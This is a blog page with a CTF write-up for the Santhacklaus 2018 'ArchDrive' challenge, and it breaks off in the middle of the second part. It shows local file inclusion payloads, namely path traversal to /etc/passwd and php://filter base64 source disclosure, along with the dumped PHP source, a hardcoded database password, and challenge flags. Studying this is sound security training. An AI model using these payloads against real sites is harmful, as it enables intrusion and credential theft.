@@ -1,0 +1,872 @@
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>[Santhacklaus 2018] - ArchDrive - Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)</title><meta name=Description content="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><meta property="og:title" content="[Santhacklaus 2018] - ArchDrive"><meta property="og:description" content="ArchDrive 1/3 Statement State of the art This comes with a really good looking website:
+I notice a strange GET parameter when clicking on Reset it:
+https://archdrive.santhacklaus.xyz/?page=reset.php
+Basic local file inclusion I tried to include /etc/passwd file:
+https://archdrive.santhacklaus.xyz/?page=../../../../../../../../../etc/passwd
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 root❌0:0:root:/root:/bin/bash daemon❌1:1:daemon:/usr/sbin:/usr/sbin/nologin bin❌2:2:bin:/bin:/usr/sbin/nologin sys❌3:3:sys:/dev:/usr/sbin/nologin sync❌4:65534:sync:/bin:/bin/sync games❌5:60:games:/usr/games:/usr/sbin/nologin man❌6:12:man:/var/cache/man:/usr/sbin/nologin lp❌7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail❌8:8:mail:/var/mail:/usr/sbin/nologin news❌9:9:news:/var/spool/news:/usr/sbin/nologin uucp❌10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy❌13:13:proxy:/bin:/usr/sbin/nologin www-data❌33:33:www-data:/var/www:/usr/sbin/nologin backup❌34:34:backup:/var/backups:/usr/sbin/nologin list❌38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc❌39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats❌41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody❌65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt❌100:65534::/nonexistent:/bin/false G0lD3N_Us3r❌1000:1000:IMTLD{Th1s_iS_4n_ImP0rt4nT_uS3r},,,:/home/G0lD3N_Us3r:/bin/bash w00t!"><meta property="og:type" content="article"><meta property="og:url" content="maki.bzh/writeups/santhachlaus2018archdrive/"><meta property="og:image" content="/logo.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2018-12-19T21:57:40+08:00"><meta property="article:modified_time" content="2018-12-19T21:57:40+08:00"><meta property="og:site_name" content="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="/logo.png"><meta name=twitter:title content="[Santhacklaus 2018] - ArchDrive"><meta name=twitter:description content="ArchDrive 1/3 Statement State of the art This comes with a really good looking website:
+I notice a strange GET parameter when clicking on Reset it:
+https://archdrive.santhacklaus.xyz/?page=reset.php
+Basic local file inclusion I tried to include /etc/passwd file:
+https://archdrive.santhacklaus.xyz/?page=../../../../../../../../../etc/passwd
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 root❌0:0:root:/root:/bin/bash daemon❌1:1:daemon:/usr/sbin:/usr/sbin/nologin bin❌2:2:bin:/bin:/usr/sbin/nologin sys❌3:3:sys:/dev:/usr/sbin/nologin sync❌4:65534:sync:/bin:/bin/sync games❌5:60:games:/usr/games:/usr/sbin/nologin man❌6:12:man:/var/cache/man:/usr/sbin/nologin lp❌7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail❌8:8:mail:/var/mail:/usr/sbin/nologin news❌9:9:news:/var/spool/news:/usr/sbin/nologin uucp❌10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy❌13:13:proxy:/bin:/usr/sbin/nologin www-data❌33:33:www-data:/var/www:/usr/sbin/nologin backup❌34:34:backup:/var/backups:/usr/sbin/nologin list❌38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc❌39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats❌41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody❌65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt❌100:65534::/nonexistent:/bin/false G0lD3N_Us3r❌1000:1000:IMTLD{Th1s_iS_4n_ImP0rt4nT_uS3r},,,:/home/G0lD3N_Us3r:/bin/bash w00t!"><meta name=application-name content="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><meta name=apple-mobile-web-app-title content="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=maki.bzh/writeups/santhachlaus2018archdrive/><link rel=prev href=maki.bzh/writeups/santhacklaus2018bretstiles/><link rel=next href=maki.bzh/writeups/otterctf2018network/><link rel=stylesheet href=/maki.bzh/css/style.min.css><link rel=preload href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css as=style onload="this.onload=null,this.rel='stylesheet'"><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css></noscript><link rel=preload href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css as=style onload="this.onload=null,this.rel='stylesheet'"><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"[Santhacklaus 2018] - ArchDrive","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"maki.bzh\/writeups\/santhachlaus2018archdrive\/"},"image":["\/images\/Apple-Devices-Preview.png"],"genre":"writeups","keywords":"santhacklaus, pinkflood, pentest, web, lfi, sudo, tar, xxe","wordcount":2366,"url":"maki.bzh\/writeups\/santhachlaus2018archdrive\/","datePublished":"2018-12-19T21:57:40+08:00","dateModified":"2018-12-19T21:57:40+08:00","license":"This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher":{"@type":"Organization","name":"xxxx","logo":"\/lib\/images\/avatar.png"},"author":{"@type":"Person","name":"Maki"},"description":""}</script></head><body data-header-desktop=fixed data-header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem('theme')?localStorage.getItem('theme')==='dark':'dark'==='auto'?window.matchMedia('(prefers-color-scheme: dark)').matches:'dark'==='dark')&&document.body.setAttribute('theme','dark')</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=maki.bzh/ title="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><span class=header-title-pre><i class='far fa-kiss-wink-heart fa-fw' aria-hidden=true></i></span></a></div><div class=menu><div class=menu-inner><a class=menu-item href=/maki.bzh/posts/>Posts </a><a class=menu-item href=/maki.bzh/shorts/>Shorts </a><a class=menu-item href=/maki.bzh/offers/>Offers </a><a class=menu-item href=/maki.bzh/writeups/>Writeups </a><a class=menu-item href=/maki.bzh/tags/>Tags </a><a class=menu-item href=/maki.bzh/about/>About </a><span class="menu-item delimiter"></span><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
+<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=maki.bzh/ title="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><span class=header-title-pre><i class='far fa-kiss-wink-heart fa-fw' aria-hidden=true></i></span></a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><a class=menu-item href=/maki.bzh/posts/ title>Posts</a><a class=menu-item href=/maki.bzh/shorts/ title>Shorts</a><a class=menu-item href=/maki.bzh/offers/ title>Offers</a><a class=menu-item href=/maki.bzh/writeups/ title>Writeups</a><a class=menu-item href=/maki.bzh/tags/ title>Tags</a><a class=menu-item href=/maki.bzh/about/ title>About</a><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
+<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></header><main class=main><div class=container><div class="page single special"><h1 class="single-title animate__animated animate__pulse animate__faster">[Santhacklaus 2018] - ArchDrive</h1><div class=content id=content><h2 id=archdrive-13>ArchDrive 1/3</h2><h3 id=statement>Statement</h3><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2018_santhacklaus/archdrive/statement_archdrive1.png data-srcset="/lib/images/writeups/2018_santhacklaus/archdrive/statement_archdrive1.png, /lib/images/writeups/2018_santhacklaus/archdrive/statement_archdrive1.png 1.5x, /lib/images/writeups/2018_santhacklaus/archdrive/statement_archdrive1.png 2x" data-sizes=auto alt=/lib/images/writeups/2018_santhacklaus/archdrive/statement_archdrive1.png title=/lib/images/writeups/2018_santhacklaus/archdrive/statement_archdrive1.png></p><h3 id=state-of-the-art>State of the art</h3><p>This comes with a really good looking website:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2018_santhacklaus/archdrive/archdrive1_1.png data-srcset="/lib/images/writeups/2018_santhacklaus/archdrive/archdrive1_1.png, /lib/images/writeups/2018_santhacklaus/archdrive/archdrive1_1.png 1.5x, /lib/images/writeups/2018_santhacklaus/archdrive/archdrive1_1.png 2x" data-sizes=auto alt=/lib/images/writeups/2018_santhacklaus/archdrive/archdrive1_1.png title=/lib/images/writeups/2018_santhacklaus/archdrive/archdrive1_1.png></p><p>I notice a strange GET parameter when clicking on <code>Reset it</code>:</p><blockquote><p><a href="https://archdrive.santhacklaus.xyz/?page=reset.php" target=_blank rel="noopener noreffer">https://archdrive.santhacklaus.xyz/?page=reset.php</a></p></blockquote><h3 id=basic-local-file-inclusion>Basic local file inclusion</h3><p>I tried to include <code>/etc/passwd</code> file:</p><blockquote><p><a href="https://archdrive.santhacklaus.xyz/?page=../../../../../../../../../etc/passwd" target=_blank rel="noopener noreffer">https://archdrive.santhacklaus.xyz/?page=../../../../../../../../../etc/passwd</a></p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>root❌0:0:root:/root:/bin/bash
+</span></span><span class=line><span class=cl>daemon❌1:1:daemon:/usr/sbin:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>bin❌2:2:bin:/bin:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>sys❌3:3:sys:/dev:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>sync❌4:65534:sync:/bin:/bin/sync
+</span></span><span class=line><span class=cl>games❌5:60:games:/usr/games:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>man❌6:12:man:/var/cache/man:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>lp❌7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>mail❌8:8:mail:/var/mail:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>news❌9:9:news:/var/spool/news:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>uucp❌10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>proxy❌13:13:proxy:/bin:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>www-data❌33:33:www-data:/var/www:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>backup❌34:34:backup:/var/backups:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>list❌38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>irc❌39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>gnats❌41:41:Gnats Bug-Reporting System <span class=o>(</span>admin<span class=o>)</span>:/var/lib/gnats:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>nobody❌65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>_apt❌100:65534::/nonexistent:/bin/false
+</span></span><span class=line><span class=cl>G0lD3N_Us3r❌1000:1000:IMTLD<span class=o>{</span>Th1s_iS_4n_ImP0rt4nT_uS3r<span class=o>}</span>,,,:/home/G0lD3N_Us3r:/bin/bash
+</span></span></code></pre></td></tr></table></div></div><p>w00t!</p><h3 id=flag>Flag</h3><blockquote><p>IMTLD{Th1s_iS_4n_ImP0rt4nT_uS3r}</p></blockquote><h2 id=archdrive-23>ArchDrive 2/3</h2><h3 id=statement-1>Statement</h3><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2018_santhacklaus/archdrive/statement_archdrive2.png data-srcset="/lib/images/writeups/2018_santhacklaus/archdrive/statement_archdrive2.png, /lib/images/writeups/2018_santhacklaus/archdrive/statement_archdrive2.png 1.5x, /lib/images/writeups/2018_santhacklaus/archdrive/statement_archdrive2.png 2x" data-sizes=auto alt=/lib/images/writeups/2018_santhacklaus/archdrive/statement_archdrive2.png title=/lib/images/writeups/2018_santhacklaus/archdrive/statement_archdrive2.png></p><h3 id=state-of-the-art-1>State of the art</h3><p>Ok, we got a <strong>Local file inclusion</strong>, let&rsquo;s try to use the base64 php wrapper (go on payload all the things):</p><blockquote><p><a href="https://archdrive.santhacklaus.xyz/?page=pHp://FilTer/convert.base64-encode/resource=reset.php" target=_blank rel="noopener noreffer">https://archdrive.santhacklaus.xyz/?page=pHp://FilTer/convert.base64-encode/resource=reset.php</a></p></blockquote><p>It gives me some base64 data, here is the decoded data:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span><span class=lnt>64
+</span><span class=lnt>65
+</span><span class=lnt>66
+</span><span class=lnt>67
+</span><span class=lnt>68
+</span><span class=lnt>69
+</span><span class=lnt>70
+</span><span class=lnt>71
+</span><span class=lnt>72
+</span><span class=lnt>73
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span> <span class=nx>session_start</span><span class=p>();</span> <span class=cp>?&gt;</span><span class=err>
+</span></span></span><span class=line><span class=cl><span class=err>&lt;!DOCTYPE html&gt;
+</span></span></span><span class=line><span class=cl><span class=err>&lt;html lang=&#34;en&#34;&gt;
+</span></span></span><span class=line><span class=cl><span class=err>&lt;head&gt;
+</span></span></span><span class=line><span class=cl><span class=err>&lt;title&gt;Reset Your Password&lt;/title&gt;
+</span></span></span><span class=line><span class=cl><span class=err>&lt;meta charset=&#34;UTF-8&#34;&gt;
+</span></span></span><span class=line><span class=cl><span class=err>&lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1&#34;&gt;
+</span></span></span><span class=line><span class=cl><span class=err>&lt;link rel=&#34;icon&#34; type=&#34;image/png&#34; href=&#34;images/icons/favicon.ico&#34;/&gt;
+</span></span></span><span class=line><span class=cl><span class=err>&lt;link rel=&#34;stylesheet&#34; type=&#34;text/css&#34; href=&#34;vendor/bootstrap/css/bootstrap.min.css&#34;&gt;
+</span></span></span><span class=line><span class=cl><span class=err>&lt;link rel=&#34;stylesheet&#34; type=&#34;text/css&#34; href=&#34;fonts/font-awesome-4.7.0/css/font-awesome.min.css&#34;&gt;
+</span></span></span><span class=line><span class=cl><span class=err>&lt;link rel=&#34;stylesheet&#34; type=&#34;text/css&#34; href=&#34;fonts/iconic/css/material-design-iconic-font.min.css&#34;&gt;
+</span></span></span><span class=line><span class=cl><span class=err>&lt;link rel=&#34;stylesheet&#34; type=&#34;text/css&#34; href=&#34;vendor/animate/animate.css&#34;&gt;
+</span></span></span><span class=line><span class=cl><span class=err>&lt;link rel=&#34;stylesheet&#34; type=&#34;text/css&#34; href=&#34;vendor/css-hamburgers/hamburgers.min.css&#34;&gt;
+</span></span></span><span class=line><span class=cl><span class=err>&lt;link rel=&#34;stylesheet&#34; type=&#34;text/css&#34; href=&#34;vendor/animsition/css/animsition.min.css&#34;&gt;
+</span></span></span><span class=line><span class=cl><span class=err>&lt;link rel=&#34;stylesheet&#34; type=&#34;text/css&#34; href=&#34;vendor/select2/select2.min.css&#34;&gt;
+</span></span></span><span class=line><span class=cl><span class=err>&lt;link rel=&#34;stylesheet&#34; type=&#34;text/css&#34; href=&#34;vendor/daterangepicker/daterangepicker.css&#34;&gt;
+</span></span></span><span class=line><span class=cl><span class=err>&lt;link rel=&#34;stylesheet&#34; type=&#34;text/css&#34; href=&#34;css/util.css&#34;&gt;
+</span></span></span><span class=line><span class=cl><span class=err>&lt;link rel=&#34;stylesheet&#34; type=&#34;text/css&#34; href=&#34;css/main.css&#34;&gt;
+</span></span></span><span class=line><span class=cl><span class=err>&lt;/head&gt;
+</span></span></span><span class=line><span class=cl><span class=err>&lt;body&gt;
+</span></span></span><span class=line><span class=cl><span class=err>&lt;div class=&#34;limiter&#34;&gt;
+</span></span></span><span class=line><span class=cl><span class=err>    &lt;div class=&#34;container-login100&#34;&gt;
+</span></span></span><span class=line><span class=cl><span class=err>        &lt;div class=&#34;wrap-login100&#34;&gt;
+</span></span></span><span class=line><span class=cl><span class=err>            &lt;form class=&#34;login100-form validate-form&#34; method=&#34;post&#34; action=&#34;?page=reset.php&#34;&gt;
+</span></span></span><span class=line><span class=cl><span class=err>&lt;span class=&#34;login100-form-title p-b-48&#34;&gt;
+</span></span></span><span class=line><span class=cl><span class=err>&lt;a href=&#34;index.php&#34;&gt;&lt;img class=&#34;logo-brand&#34; src=&#34;images/archdrive-color.png&#34; alt=&#34;ArchDrive logo&#34;&gt;&lt;/a&gt;
+</span></span></span><span class=line><span class=cl><span class=err>&lt;/span&gt;
+</span></span></span><span class=line><span class=cl><span class=err>&lt;span class=&#34;login100-form-title p-b-26&#34;&gt;
+</span></span></span><span class=line><span class=cl><span class=err>ArchDrive
+</span></span></span><span class=line><span class=cl><span class=err>&lt;/span&gt;
+</span></span></span><span class=line><span class=cl><span class=err>&lt;p class=&#34;login100-form-title&#34; style=&#34;font-size: 24px&#34;&gt;Reset My Password&lt;/p&gt;&lt;/br&gt;
+</span></span></span><span class=line><span class=cl><span class=err>
+</span></span></span><span class=line><span class=cl><span class=err>&lt;?php
+</span></span></span><span class=line><span class=cl><span class=err>    if(isset($_POST[&#39;recover&#39;]))
+</span></span></span><span class=line><span class=cl><span class=err>    {
+</span></span></span><span class=line><span class=cl><span class=err>    ?&gt;
+</span></span></span><span class=line><span class=cl><span class=err>&lt;p&gt;Email sent !&lt;/p&gt;
+</span></span></span><span class=line><span class=cl><span class=err>&lt;?php
+</span></span></span><span class=line><span class=cl><span class=err>    }
+</span></span></span><span class=line><span class=cl><span class=err>    ?&gt;
+</span></span></span><span class=line><span class=cl><span class=err>
+</span></span></span><span class=line><span class=cl><span class=err>
+</span></span></span><span class=line><span class=cl><span class=err>&lt;div class=&#34;wrap-input100 validate-input&#34; data-validate = &#34;Valid email is: a@b.c&#34;&gt;
+</span></span></span><span class=line><span class=cl><span class=err>&lt;input class=&#34;input100&#34; type=&#34;text&#34; name=&#34;email&#34;&gt;
+</span></span></span><span class=line><span class=cl><span class=err>&lt;span class=&#34;focus-input100&#34; data-placeholder=&#34;Email (only from @archdrive.corp)&#34;&gt;&lt;/span&gt;
+</span></span></span><span class=line><span class=cl><span class=err>&lt;/div&gt;
+</span></span></span><span class=line><span class=cl><span class=err>
+</span></span></span><span class=line><span class=cl><span class=err>&lt;div class=&#34;container-login100-form-btn&#34;&gt;
+</span></span></span><span class=line><span class=cl><span class=err>&lt;div class=&#34;wrap-login100-form-btn&#34;&gt;
+</span></span></span><span class=line><span class=cl><span class=err>&lt;div class=&#34;login100-form-bgbtn&#34;&gt;&lt;/div&gt;
+</span></span></span><span class=line><span class=cl><span class=err>&lt;button class=&#34;login100-form-btn&#34; name=&#34;recover&#34;&gt;Recover Password&lt;/button&gt;
+</span></span></span><span class=line><span class=cl><span class=err>&lt;/div&gt;
+</span></span></span><span class=line><span class=cl><span class=err>&lt;/div&gt;
+</span></span></span><span class=line><span class=cl><span class=err>&lt;/form&gt;
+</span></span></span><span class=line><span class=cl><span class=err>&lt;/div&gt;
+</span></span></span><span class=line><span class=cl><span class=err>&lt;/div&gt;
+</span></span></span><span class=line><span class=cl><span class=err>&lt;/div&gt;
+</span></span></span><span class=line><span class=cl><span class=err>
+</span></span></span><span class=line><span class=cl><span class=err>
+</span></span></span><span class=line><span class=cl><span class=err>&lt;div id=&#34;dropDownSelect1&#34;&gt;&lt;/div&gt;
+</span></span></span><span class=line><span class=cl><span class=err>
+</span></span></span><span class=line><span class=cl><span class=err>&lt;script src=&#34;vendor/jquery/jquery-3.2.1.min.js&#34;&gt;&lt;/script&gt;
+</span></span></span><span class=line><span class=cl><span class=err>&lt;script src=&#34;vendor/animsition/js/animsition.min.js&#34;&gt;&lt;/script&gt;
+</span></span></span><span class=line><span class=cl><span class=err>&lt;script src=&#34;vendor/bootstrap/js/popper.js&#34;&gt;&lt;/script&gt;
+</span></span></span><span class=line><span class=cl><span class=err>&lt;script src=&#34;vendor/bootstrap/js/bootstrap.min.js&#34;&gt;&lt;/script&gt;
+</span></span></span><span class=line><span class=cl><span class=err>&lt;script src=&#34;vendor/select2/select2.min.js&#34;&gt;&lt;/script&gt;
+</span></span></span><span class=line><span class=cl><span class=err>&lt;script src=&#34;vendor/daterangepicker/moment.min.js&#34;&gt;&lt;/script&gt;
+</span></span></span><span class=line><span class=cl><span class=err>&lt;script src=&#34;vendor/daterangepicker/daterangepicker.js&#34;&gt;&lt;/script&gt;
+</span></span></span><span class=line><span class=cl><span class=err>&lt;script src=&#34;vendor/countdowntime/countdowntime.js&#34;&gt;&lt;/script&gt;
+</span></span></span><span class=line><span class=cl><span class=err>&lt;script src=&#34;js/main.js&#34;&gt;&lt;/script&gt;
+</span></span></span><span class=line><span class=cl><span class=err>
+</span></span></span><span class=line><span class=cl><span class=err>&lt;/body&gt;
+</span></span></span><span class=line><span class=cl><span class=err>&lt;/html&gt;
+</span></span></span></code></pre></td></tr></table></div></div><h3 id=local-file-inclusion>Local file inclusion</h3><p>The <strong>index.php</strong> file doesn&rsquo;t work, I didn&rsquo;t succeed to extracted it. Nevermind, there is a <strong>login.php</strong> file, found in the index form:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2018_santhacklaus/archdrive/archdrive2_1.png data-srcset="/lib/images/writeups/2018_santhacklaus/archdrive/archdrive2_1.png, /lib/images/writeups/2018_santhacklaus/archdrive/archdrive2_1.png 1.5x, /lib/images/writeups/2018_santhacklaus/archdrive/archdrive2_1.png 2x" data-sizes=auto alt=/lib/images/writeups/2018_santhacklaus/archdrive/archdrive2_1.png title=/lib/images/writeups/2018_santhacklaus/archdrive/archdrive2_1.png></p><p>Then:</p><blockquote><p><a href="https://archdrive.santhacklaus.xyz/?page=pHp://FilTer/convert.base64-encode/resource=login.php" target=_blank rel="noopener noreffer">https://archdrive.santhacklaus.xyz/?page=pHp://FilTer/convert.base64-encode/resource=login.php</a></p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl>  <span class=nx>session_start</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  <span class=nv>$state</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>\stdClass</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=nx>isset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;email&#39;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=k>empty</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;email&#39;</span><span class=p>])</span> <span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=nx>isset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;pass&#39;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=k>empty</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;pass&#39;</span><span class=p>])</span> <span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>      <span class=nv>$bdd</span> <span class=o>=</span> <span class=nx>mysqli_connect</span><span class=p>(</span><span class=s1>&#39;database:3306&#39;</span><span class=p>,</span> <span class=s1>&#39;archdrive-corpo-bdd-admin&#39;</span><span class=p>,</span> <span class=s1>&#39;8mkxdcwwyvtk36snF2b4TcEqSjh4Cc&#39;</span><span class=p>,</span> <span class=s1>&#39;ctf-archdrive-corp&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span><span class=nx>mysqli_connect_errno</span><span class=p>())</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>          <span class=nv>$state</span><span class=o>-&gt;</span><span class=na>return</span> <span class=o>=</span> <span class=s1>&#39;error&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>          <span class=nv>$state</span><span class=o>-&gt;</span><span class=na>string</span> <span class=o>=</span> <span class=s1>&#39;Connection error&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>          <span class=nv>$state_json</span> <span class=o>=</span> <span class=nx>json_encode</span><span class=p>(</span><span class=nv>$state</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>          <span class=k>echo</span> <span class=nv>$state_json</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>          <span class=k>return</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>      <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>      <span class=nv>$user</span> <span class=o>=</span> <span class=nx>mysqli_real_escape_string</span><span class=p>(</span><span class=nv>$bdd</span><span class=p>,</span> <span class=nx>strtolower</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;email&#39;</span><span class=p>]));</span>
